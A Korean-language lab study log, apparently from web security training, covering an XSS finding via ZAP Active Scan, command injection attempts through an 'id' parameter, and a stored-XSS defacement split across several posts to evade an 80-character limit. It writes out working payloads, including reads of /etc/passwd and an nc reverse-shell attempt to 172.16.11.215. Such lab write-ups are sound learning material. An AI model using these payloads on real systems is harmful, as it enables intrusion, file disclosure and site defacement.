## ZAP Active Scan으로 XSS 탐지

ZAP Active Scan을 돌려본 결과, 특정 입력 필드에서 **XSS(Cross-Site Scripting) 취약점**이 리포트로 잡혔습니다.

**검증 페이로드**
```html
<script>alert("hack")</script>
```

이 스크립트가 필터링 없이 그대로 삽입되어 페이지 로드 시 실행되는 것을 확인 → 입력값에 대한 이스케이프/새니타이징이 전혀 되어 있지 않다는 뜻이었습니다.

**핵심 포인트**
- ZAP Active Scan은 알려진 페이로드 패턴을 자동으로 여러 필드에 주입해보고, 응답에 그대로 반사되는지(Reflected) 혹은 저장되는지(Stored)를 탐지
- `alert()` 같은 단순 팝업 페이로드는 "실제로 스크립트가 실행 가능한 지점인가"를 빠르게 확인하는 용도(PoC, Proof of Concept)

## 커맨드 인젝션 단서 분석 - id 파라미터

### 1) 단서
`data_dir/100.txt` 파일을 찾을 수 없다는 에러 메시지가 반환됨 → 서버가 **`id` 파라미터 값을 파일 경로 조합에 그대로 사용**하고 있다는 힌트로 해석.

### 2) 시도한 페이로드들

```
id=100;cat /etc/hosts;cat data_dir/36
id=100;cat /etc/passwd;cat data_dir/36
id=100;nc 172.16.11.215 5555;cat data_dir/36
```

**해석**
- 세미콜론(`;`)으로 명령어를 구분해 붙이는 방식 → 서버 쪽에서 `id` 값을 셸 명령어 인자로 넘길 때 별도의 이스케이프 처리 없이 그대로 실행한다면, 세미콜론 뒤의 명령어도 함께 실행되는 구조를 가정하고 테스트
- `cat /etc/hosts`, `cat /etc/passwd`는 서버가 실제로 OS 명령을 실행하는지 확인하기 위한 기본 확인용 명령
- 마지막 `nc 172.16.11.215 5555`는 지정한 IP:PORT로 리버스 셸 연결을 시도해보는 페이로드였고, 뒤에 `cat data_dir/36`을 붙여 정상 응답 흐름(에러 없이 36번 파일을 읽어오는지)이 유지되는지 함께 확인

### 3) 정리
- 파일명이 없다는 에러 문구 자체가 **서버 내부 로직(파일 경로 구성 방식)을 추측할 수 있는 단서**가 된다는 점이 인상적이었습니다.
- 커맨드 인젝션은 아직 성공 여부를 확정하지 못했고, 응답값 비교와 blind 방식(시간 지연, 외부 연결 여부)으로 추가 검증이 필요한 상태로 남겨뒀습니다.

## Defacement 공격 - Stored XSS로 화면 통째로 갈아엎기

### 1) 접근 경로
```
1. /bbs_list.php 접속
2. /bbs_add.php 로 이동해 게시글 작성
```

### 2) 1차 시도 - 실패
```html
<script>document.innerHTML("defaced")</script>
```
- `document.innerHTML`은 애초에 존재하지 않는 API 호출(정확히는 `document.body.innerHTML`에 값을 **대입**해야 하는데 함수처럼 호출)이라 동작하지 않음
- 게시판 입력 글자 수 제한이 **80자 미만**이라 페이로드를 한 번에 다 넣을 수 없었음

### 3) 우회 - 여러 게시글로 나눠서 조합

글자 수 제한 때문에 하나의 완성된 스크립트를 **3개의 게시글로 쪼개서** 순서를 맞춰 등록했습니다.

```html
<script>var str="<iframe width=100% height=100% src=http://www.daum.net";  ← (3) 먼저 작성
str += " scrolling=no frameborder=0 /><iframe>";                          ← (2)
document.body.innerHTML=str; </script>                                     ← (1) 가장 먼저 실행되도록 배치
```

**동작 원리**
- 문자열을 변수 `str`에 나눠 담아 이어붙인 뒤, 최종적으로 `document.body.innerHTML = str`로 **페이지 전체 DOM을 통째로 교체**
- `<iframe>`을 `width=100% height=100%`로 꽉 채워서 삽입 → 사용자 눈에는 원래 사이트가 완전히 다른 화면(`daum.net`)으로 바뀐 것처럼 보임
- 이게 바로 **Defacement(홈페이지 변조)** 공격의 전형적인 형태: 서버의 파일을 직접 변조하는 게 아니라, **Stored XSS로 브라우저에서 렌더링되는 화면을 통째로 갈아치우는** 방식

### 4) 결론
80자 제한이라는 필터를 "완성된 페이로드를 한 번에 넣지 못하게 막는" 방어책으로 걸어뒀더라도, **여러 게시글에 걸쳐 변수 조각을 나눠 저장하고 브라우저가 실행 시점에 합치도록** 만들면 우회가 가능하다는 걸 확인했습니다.

## 오늘의 회고

- ZAP Active Scan은 수동으로 하나하나 입력 필드를 테스트하는 것보다 훨씬 빠르게 "어디부터 파봐야 할지" 방향을 잡아줘서, 오늘처럼 여러 취약점을 넘나드는 실습에서 진입점 역할을 톡톡히 했습니다.
- 커맨드 인젝션 파트는 에러 메시지 한 줄(`100.txt 파일을 찾을 수 없다`)에서 서버 내부 파일 경로 로직을 추측해나가는 과정이 인상 깊었고, 다음엔 blind 방식(응답 지연, 외부 서버로의 연결 로그 확인)으로 성공 여부를 확실히 검증해볼 계획입니다.
- Defacement 파트에서 가장 크게 배운 건 **"글자 수 제한 = 안전"이 아니라는 점**이었습니다. 페이로드를 여러 조각/여러 요청으로 쪼개 저장한 뒤 클라이언트(브라우저)가 합쳐서 실행하게 만들면, 단일 필드의 길이 제한은 방어 수단으로서 의미가 거의 없다는 걸 직접 체감했습니다.
- 결국 오늘 세 가지 실습(XSS 탐지 → 인젝션 단서 분석 → Defacement)은 전부 "**서버가 클라이언트 입력을 얼마나 신뢰하는가**"라는 동일한 뿌리에서 나온 문제였다는 게 가장 큰 정리 포인트였습니다.
